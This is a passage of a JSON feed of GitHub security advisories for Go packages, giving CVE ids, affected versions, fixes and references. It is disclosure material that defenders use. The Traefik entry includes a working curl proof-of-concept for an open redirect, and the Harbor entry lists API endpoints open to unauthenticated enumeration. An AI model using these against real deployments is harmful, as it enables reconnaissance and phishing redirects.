"https://febinj.medium.com/critical-csrf-to-rce-in-filebrowser-865a3c34b8e7"}, {"type": "PACKAGE", "url": "https://github.com/filebrowser/filebrowser/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0563"}, {"type": "WEB", "url": "https://systemweakness.com/critical-csrf-to-rce-in-filebrowser-865a3c34b8e7"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/165885/FileBrowser-2.17.2-Code-Execution-Cross-Site-Request-Forgery.html"}], "database_specific": {"cwe_ids": ["CWE-352"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-02-08T18:32:54Z", "nvd_published_at": "2022-02-04T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hwrr-rhmm-vcvf", "modified": "2021-05-12T21:41:14Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2020-8569"], "summary": "NULL Pointer Dereference in Kubernetes CSI snapshot-controller", "details": "Kubernetes CSI snapshot-controller prior to v2.1.3 and v3.0.2 could panic when processing a VolumeSnapshot custom resource when:\n\n- The VolumeSnapshot referenced a non-existing PersistentVolumeClaim and the VolumeSnapshot did not reference any VolumeSnapshotClass.\n- The snapshot-controller crashes, is automatically restarted by Kubernetes, and processes the same VolumeSnapshot custom resource after the restart, entering an endless crashloop.\n\nOnly the volume snapshot feature is affected by this vulnerability. When exploited, users can\u00e2\u20ac\u2122t take snapshots of their volumes or delete the snapshots. All other Kubernetes functionality is not affected.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kubernetes-csi/external-snapshotter/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.1.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes-csi/external-snapshotter/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.0.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-8569"}, {"type": "WEB", "url": "https://github.com/kubernetes-csi/external-snapshotter/issues/380"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/1EzCr1qUxxU"}], "database_specific": {"cwe_ids": ["CWE-476"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-12T21:41:14Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-f9fq-vjvh-779p", "modified": "2023-10-02T13:57:55Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2020-24359"], "summary": "Improper Input Validation in vault-ssh-helper", "details": "HashiCorp vault-ssh-helper (github.com/hashicorp/vault-ssh-helper/helper) up to and including version 0.1.6 incorrectly accepted Vault-issued SSH OTPs for the subnet in which a host's network interface was located, rather than the specific IP address assigned to that interface. Fixed in 0.2.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault-ssh-helper"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.2.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-24359"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault-ssh-helper/commit/83effd08cbcbe4b993d776bd9b39465cd9e4603f"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault-ssh-helper/blob/master/CHANGELOG.md#020-august-19-2020"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault-ssh-helper/releases"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-12T20:21:27Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-r3gq-wxqf-q4gh", "modified": "2022-02-14T23:01:49Z", "published": "2022-02-10T00:00:32Z", "aliases": ["CVE-2021-45329"], "summary": "Cross-site Scripting in Gitea", "details": "Cross Site Scripting (XSS) vulnerability exists in Gitea before 1.5.1 via the repository settings inside the external wiki/issue tracker URL field.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-gitea/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.5.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-45329"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/4710"}, {"type": "WEB", "url": "https://blog.gitea.io/2018/09/gitea-1.5.1-is-released/"}, {"type": "PACKAGE", "url": "https://github.com/go-gitea/gitea"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-02-14T23:01:49Z", "nvd_published_at": "2022-02-08T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4wp3-8q92-mh8w", "modified": "2023-09-15T20:20:04Z", "published": "2022-02-09T00:00:29Z", "aliases": ["CVE-2021-45326"], "summary": "Cross Site Request Forgery in Gitea", "details": "Cross Site Request Forgery (CSRF) vulnerability exists in Gitea before 1.5.2 via API routes.This can be dangerous especially with state altering POST requests.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-gitea/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.5.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-45326"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/issues/4838"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/4840"}, {"type": "WEB", "url": "https://blog.gitea.io/2018/10/gitea-1.5.2-is-released/"}, {"type": "PACKAGE", "url": "https://github.com/go-gitea/gitea"}], "database_specific": {"cwe_ids": ["CWE-352"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-02-14T23:01:01Z", "nvd_published_at": "2022-02-08T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gfh2-7jg5-653p", "modified": "2021-05-20T16:29:42Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2016-8579"], "summary": "Denial of Service in docker2aci", "details": "docker2aci <= 0.12.3 has an infinite loop when handling local images with cyclic dependency chain.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/appc/docker2aci"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.13.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-8579"}, {"type": "WEB", "url": "https://github.com/appc/docker2aci/issues/203"}, {"type": "WEB", "url": "https://github.com/appc/docker2aci/pull/204/commits/54331ec7020e102935c31096f336d31f6400064f"}, {"type": "WEB", "url": "https://github.com/appc/docker2aci/releases/tag/v0.13.0"}, {"type": "WEB", "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-8579"}, {"type": "WEB", "url": "https://www.securityfocus.com/bid/93560"}], "database_specific": {"cwe_ids": ["CWE-835"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-20T16:29:42Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-856q-xv3c-7f2f", "modified": "2022-02-25T15:38:52Z", "published": "2022-02-23T14:59:08Z", "aliases": ["CVE-2022-23635"], "summary": "Unauthenticated control plane denial of service attack in Istio", "details": "### Impact\nThe Istio control plane, `istiod`, is vulnerable to a request processing error, allowing a malicious attacker that sends a specially crafted message which results in the control plane crashing. This endpoint is served over TLS port 15012, but does not require any authentication from the attacker.\n\nFor simple installations, Istiod is typically only reachable from within the cluster, limiting the blast radius. However, for some deployments, especially [multicluster](https://istio.io/latest/docs/setup/install/multicluster/primary-remote/) topologies, this port is exposed over the public internet.\n\n### Patches\n\n- Istio 1.13.1 and above\n- Istio 1.12.4 and above\n- Istio 1.11.7 and above\n\n### Workarounds\nThere are no effective workarounds, beyond upgrading. Limiting network access to Istiod to the minimal set of clients can help lessen the scope of the vulnerability to some extent.\n\n### References\nMore details can be found in the [Istio Security Bulletin](https://istio.io/latest/news/security/istio-security-2022-003)\n\n### For more information\nIf you have any questions or comments about this advisory, please email us at [istio-security-vulnerability-reports@googlegroups.com](mailto:istio-security-vulnerability-reports@googlegroups.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "istio.io/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.13.1"}]}], "versions": ["1.13.0"]}, {"package": {"ecosystem": "Go", "name": "istio.io/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "1.12.4"}]}]}, {"package": {"ecosystem": "Go", "name": "istio.io/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.11.7"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/istio/istio/security/advisories/GHSA-856q-xv3c-7f2f"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23635"}, {"type": "WEB", "url": "https://github.com/istio/istio/commit/5f3b5ed958ae75156f8656fe7b3794f78e94db84"}, {"type": "PACKAGE", "url": "https://github.com/istio/istio/"}, {"type": "WEB", "url": "https://istio.io/latest/news/security/istio-security-2022-003"}], "database_specific": {"cwe_ids": ["CWE-1284", "CWE-287"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-02-23T14:59:08Z", "nvd_published_at": "2022-02-22T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h2fg-54x9-5qhq", "modified": "2023-02-17T22:18:36Z", "published": "2022-02-11T23:43:13Z", "aliases": ["CVE-2020-26521"], "summary": "Nil dereference in NATS JWT, DoS of nats-server", "details": "## Problem Description\n\nThe NATS account system has an Operator trusted by the servers, which signs Accounts, and each Account can then create and sign Users within their account.  The Operator should be able to safely issue Accounts to other entities which it does not fully trust.\n\nA malicious Account could create and sign a User JWT with a state not created by the normal tooling, such that decoding by the NATS JWT library (written in Go) would attempt a nil dereference, aborting execution.\n\nThe NATS Server is known to be impacted by this.\n\n\n## Affected versions\n\n#### JWT library\n\n * all versions prior to 1.1.0\n\n#### NATS Server\n\n * Version 2 prior to 2.1.9\n\n\n## Impact\n\n#### JWT library\n\n * Programs would nil dereference and panic, aborting execution by default.\n\n#### NATS server\n\n * Denial of Service caused by process termination\n\n\n## Workaround\n\nIf your NATS servers do not trust any accounts which are managed by untrusted entities, then malformed User credentials are unlikely to be encountered.\n\n\n## Solution\n\nUpgrade the JWT dependency in any application using it.\n\nUpgrade the NATS server if using NATS Accounts.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nats-io/jwt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/nats-io/nats-server/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.9"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/nats-io/jwt/security/advisories/GHSA-h2fg-54x9-5qhq"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26521"}, {"type": "WEB", "url": "https://github.com/nats-io/jwt/pull/107"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/commit/9ff8bcde2e46009e98bd9e88f598af355f62c168"}, {"type": "WEB", "url": "https://advisories.nats.io/CVE/CVE-2020-26521.txt"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/commits/master"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VT67XCLIIBYRT762SVFBYFFTQFVSM3SI/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0402"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2020/11/02/2"}], "database_specific": {"cwe_ids": ["CWE-476"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-21T21:32:02Z", "nvd_published_at": "2020-11-06T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jrpg-35hw-m4p9", "modified": "2022-02-14T23:01:26Z", "published": "2022-02-09T00:00:29Z", "aliases": ["CVE-2021-45327"], "summary": "Capture-replay in Gitea", "details": "Gitea is a project to help users set up a self-hosted Git service. Gitea before 1.11.2 is affected by Trusting HTTP Permission Methods on the Server Side when referencing the vulnerable admin or user API. This could allow a remote malicious user to execute arbitrary code.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-gitea/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.11.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-45327"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/10462"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/10465"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/10582"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/commit/4cb18601ff33dda5edb47d5b452cc8f2dc39dd67"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/commit/6f5656ab0ebec03fe63898208dabc802c4be46ab"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/commit/ed664a9e1dae4d4660e60c981173bbc5102e69ea"}, {"type": "WEB", "url": "https://blog.gitea.io/2020/03/gitea-1.11.2-is-released/"}, {"type": "PACKAGE", "url": "https://github.com/go-gitea/gitea"}], "database_specific": {"cwe_ids": ["CWE-294"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-02-14T23:01:26Z", "nvd_published_at": "2022-02-08T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fqfh-778m-2v32", "modified": "2021-05-21T22:06:12Z", "published": "2022-02-11T23:41:11Z", "aliases": [], "summary": "GitHub CLI can execute a git binary from the current directory", "details": "### Impact\nGitHub CLI depends on a `git.exe` executable being found in system `%PATH%` on Windows. However, if a malicious `.\\git.exe` or `.\\git.bat` is found in the current working directory at the time of running `gh`, the malicious command will be invoked instead of the system one.\n\nWindows users who run `gh` inside untrusted directories are affected.\n\n### Patches\nUsers should upgrade to GitHub CLI v1.2.1.\n\n### Workarounds\nOther than avoiding untrusted repositories, there is no workaround.\n\n### References\nhttps://github.com/golang/go/issues/38736", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cli/cli"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cli/cli/security/advisories/GHSA-fqfh-778m-2v32"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-21T22:06:12Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-8wrg-m8vm-5fvj", "modified": "2021-05-20T22:25:09Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2021-21403"], "summary": "Authentication Bypass by Primary Weakness in github.com/kongchuanhujiao/server", "details": "### Impact\n\nAuthentication Bypass by Primary Weakness (CWE-305)\n\nCommit:\n\nhttps://github.com/kongchuanhujiao/server/commit/9a125624f219e496bdf4b07b404816d5a309bdc1\n\nALL Users  is impacted.\n\n### Patches\n\nYes, PLEASE UPGRADE TO v1.3.21-beta.d0ffc0a6", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kongchuanhujiao/server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.21"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/kongchuanhujiao/server/security/advisories/GHSA-8wrg-m8vm-5fvj"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-21403"}, {"type": "WEB", "url": "https://github.com/kongchuanhujiao/server/commit/9a125624f219e496bdf4b07b404816d5a309bdc1"}], "database_specific": {"cwe_ids": ["CWE-287", "CWE-305"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-20T22:25:09Z", "nvd_published_at": "2021-03-26T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-44gg-pmqr-4669", "modified": "2021-05-20T16:28:01Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2014-6408"], "summary": "Access Restriction Bypass in Docker", "details": "Docker 1.3.0 through 1.3.1 allows remote attackers to modify the default run profile of image containers and possibly bypass the container by applying unspecified security options to an image.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/docker/docker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.3.0"}, {"fixed": "1.3.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-6408"}, {"type": "WEB", "url": "https://github.com/docker/docker/commit/c9379eb3fbbc484c056f5a5e49d8d0b755a29c45"}, {"type": "WEB", "url": "https://docs.docker.com/v1.3/release-notes/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/pipermail/package-announce/2014-December/145154.html"}, {"type": "WEB", "url": "https://lists.opensuse.org/opensuse-security-announce/2014-12/msg00009.html"}, {"type": "WEB", "url": "https://secunia.com/advisories/60171"}, {"type": "WEB", "url": "https://secunia.com/advisories/60241"}, {"type": "WEB", "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6408"}, {"type": "WEB", "url": "https://www.openwall.com/lists/oss-security/2014/11/24/5"}], "database_specific": {"cwe_ids": ["CWE-285"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-20T16:28:01Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-q9x4-q76f-5h5j", "modified": "2023-01-10T15:48:41Z", "published": "2022-02-11T23:17:25Z", "aliases": ["CVE-2019-19030"], "summary": "Unauthenticated users can exploit an enumeration vulnerability in Harbor (CVE-2019-19030)", "details": "# Impact\nSean Wright from Secureworks has discovered an enumeration vulnerability. An attacker can make use of the Harbor API to make unauthenticated calls to the Harbor instance. Based on the HTTP status code in the response, an attacker is then able to work out which resources exist, and which do not. This would likely be accomplished by either providing a wordlist or enumerating through a sequence an\nunauthenticated attacker is able to enumerate resources on the system. This provides them with information such as existing projects, repositories, etc.\n\nThe vulnerability was immediately fixed by the Harbor team.  \n\n# Issue \nThe following API resources where found to be vulnerable to enumeration attacks:\n/api/chartrepo/{repo}/prov (POST)\n/api/chartrepo/{repo}/charts (GET, POST)\n/api/chartrepo/{repo}/charts/{name} (GET, DELETE)\n/api/chartrepo/{repo}/charts/{name}/{version} (GET, DELETE)\n/api/labels?name={name}&scope=p (GET)\n/api/repositories?project_id={id} (GET)\n/api/repositories/{repo_name}/ (GET, PUT, DELETE)\n/api/repositories/{repo_name}/tags (GET)\n/api/repositories/{repo_name}/tags/{tag}/manifest?version={version} (GET)\n/api/repositories/{repo_name/{tag}/labels (GET)\n/api/projects?project_name={name} (HEAD)\n/api/projects/{project_id}/summary (GET)\n/api/projects/{project_id}/logs (GET)\n/api/projects/{project_id} (GET, PUT, DELETE)\n/api/projects/{project_id}/metadatas (GET, POST)\n/api/projects/{project_id}/metadatas/{metadata_name} (GET, PUT)\n\n# Known Attack Vectors\nSuccessful exploitation of this issue will lead to bad actors identifying which resources exist in Harbor without requiring authentication for the Harbor API.\n\n# Patches\nIf your product uses the affected releases of Harbor, update to version 1.10.3 or 2.0.1 to patch this issue immediately.\n\nhttps://github.com/goharbor/harbor/releases/tag/v1.10.3\nhttps://github.com/goharbor/harbor/releases/tag/v2.0.1\n\n# Workarounds\nThere is no known workaround\n\n# For more information\nIf you have any questions or comments about this advisory, contact cncf-harbor-security@lists.cncf.io\nView our security policy at https://github.com/goharbor/harbor/security/policy", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.7.0"}, {"fixed": "1.10.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.0.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/goharbor/harbor/security/advisories/GHSA-q9x4-q76f-5h5j"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-19030"}, {"type": "PACKAGE", "url": "https://github.com/goharbor/harbor/"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-24T18:52:37Z", "nvd_published_at": "2022-12-26T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6qq8-5wq3-86rp", "modified": "2022-08-04T20:56:21Z", "published": "2022-02-11T23:19:21Z", "aliases": ["CVE-2020-15129"], "summary": "Traefik vulnerable to Open Redirect via handling of X-Forwarded-Prefix header", "details": "## Summary\n\nThere exists a potential open redirect vulnerability in Traefik's handling of the `X-Forwarded-Prefix` header. Active Exploitation of this issue is unlikely as it would require active header injection, however the Traefik team addressed this issue nonetheless to prevent abuse in e.g. cache poisoning scenarios.\n\n## Details\n\nThe Traefik API dashboard component doesn't validate that the value of the header `X-Forwarded-Prefix` is a site relative path and will redirect to any header provided URI.\n\ne.g.\n\n```\n$ curl --header 'Host:traefik.localhost' --header 'X-Forwarded-Prefix:https://example.org' 'http://localhost:8081'\n<a href=\"https://example.org/dashboard/\">Found</a>.`\n```\n\n### Impact\nA successful exploitation of an open redirect can be used to entice victims to disclose sensitive information.\n\n### Workarounds\n\nBy using the `headers` middleware, the request header `X-Forwarded-Prefix` value can be overridden by the value `.` (dot)\n\n- https://docs.traefik.io/v2.2/middlewares/headers/#customrequestheaders\n- https://docs.traefik.io/v1.7/basics/#custom-headers\n\n### For more information\n\nIf you have any questions or comments about this advisory, open an issue in [Traefik](https://github.com/containous/traefik/issues).\n\n## Credit\n\nThis issue was found by the GitHub Application Security Team and reported on behalf of the GHAS by the GitHub Security Lab Team.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0-rc5"}, {"fixed": "1.7.26"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.3.0-rc6"}]}], "database_specific": {"last_known_affected_version_range": "< 2.2.8"}}, {"package": {"ecosystem": "Go", "name": "github.com/containous/traefik"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0-rc5"}, {"fixed": "1.7.26"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/containous/traefik/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0-rc1"}, {"fixed": "2.3.0-rc6"}]}], "database_specific": {"last_known_affected_version_range": "< 2.3.0-rc3"}}, {"package": {"ecosystem": "Go", "name": "github.com/containous/traefik/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0-rc1"}, {"fixed": "2.3.0-rc3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik/api"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0-rc5"}, {"fixed": "1.7.26"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik/v2/pkg/api"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.3.0-rc6"}]}], "database_specific": {"last_known_affected_version_range": "< 2.2.8"}}, {"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik/v2/pkg/api"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0-rc1"}, {"fixed": "2.3.0-rc6"}]}], "database_specific": {"last_known_affected_version_range": "< 2.3.0-rc3"}}, {"package": {"ecosystem": "Go", "name": "github.com/containous/traefik/api"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0-rc5"}, {"fixed": "1.7.26"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/containous/traefik/v2/pkg/api"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/containous/traefik/v2/pkg/api"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0-rc1"}, {"fixed": "2.3.0-rc3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/containous/traefik/security/advisories/GHSA-6qq8-5wq3-86rp"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15129"}, {"type": "WEB", "url": "https://github.com/containous/traefik/pull/7109"}, {"type": "WEB", "url": "https://github.com/containous/traefik/commit/cfa04c300c5db95ae8a52c31a9d973b6dd9c2254"}, {"type": "WEB", "url": "https://github.com/containous/traefik/commit/e63db782c11c7b8bfce30be4c902e7ef8f9f33d2"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/commit/e2c5f3712f68993de8ed3cb30da9ec0aa11acb09"}, {"type": "WEB", "url": "https://github.com/containous/traefik/releases/tag/v1.7.26"}, {"type": "WEB", "url": "https://github.com/containous/traefik/releases/tag/v2.2.8"}, {"type": "WEB", "url": "https://github.com/containous/traefik/releases/tag/v2.3.0-rc3"}, {"type": "PACKAGE", "url": "https://github.com/traefik/traefik"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-24T18:21:00Z", "nvd_published_at": "2020-07-30T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9m95-8hx6-7p9v", "modified": "2022-03-15T21:39:42Z", "published": "2022-02-15T01:17:37Z", "aliases": ["CVE-2021-29136"], "summary": "Improper input validation in umoci", "details": "### Impact\n\numoci 0.4.6 and earlier can be tricked into modifying host files by\ncreating a malicious layer that has a symlink with the name \".\" (or\n\"/\"). Because umoci deletes inodes if they change types, this results in\nthe rootfs directory being replaced with an attacker-controlled symlink.\nSubsequent image layers will then be applied on top of the target of the\nsymlink (which could be any directory on the host filesystem the user\nrunning umoci has access to).\n\nWhile umoci does have defences against symlink-based attacks, they are\nall implemented by resolving things relative to the rootfs directory --\nif the rootfs itself is a symlink, umoci resolves it first.\n\nThis vulnerability affects both \"umoci unpack\" and \"umoci raw unpack\".\n\n### Patches\nThis issue has been patched in umoci 0.4.7, see the references section\nfor the specific commit which fixed this vulnerability.\n\n### Workarounds\nNote that if you use umoci as an unprivileged user (using the --rootless\nflag) then umoci will not be able to overwrite any files that your user\ndoesn't have access to. Other possible mitigations are to run umoci\nunder an LSM profile such as AppArmor or SELinux to restrict the level\nof access it has outside of container image directories.\n\n### References\n* [oss-security public disclosure](https://www.openwall.com/lists/oss-security/2021/04/06/2)\n* [patch](https://github.com/opencontainers/umoci/commit/d9efc31daf2206f7d3fdb839863cf7a576a2eb57)\n\n### Credits\nThanks to Robin Peraglie from Cure53 for discovering and reporting this\nvulnerability.\n\n### For more information\n\nIf you have any questions or comments about this advisory\n* Open an issue in <https://github.com/opencontainers/umoci>.\n* Email us at <security@opencontainers.org>.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/opencontainers/umoci"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.7"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/opencontainers/umoci/security/advisories/GHSA-9m95-8hx6-7p9v"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-29136"}, {"type": "WEB", "url": "https://github.com/opencontainers/umoci/commit/d9efc31daf2206f7d3fdb839863cf7a576a2eb57"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2021/04/06/2"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-20T20:13:37Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", 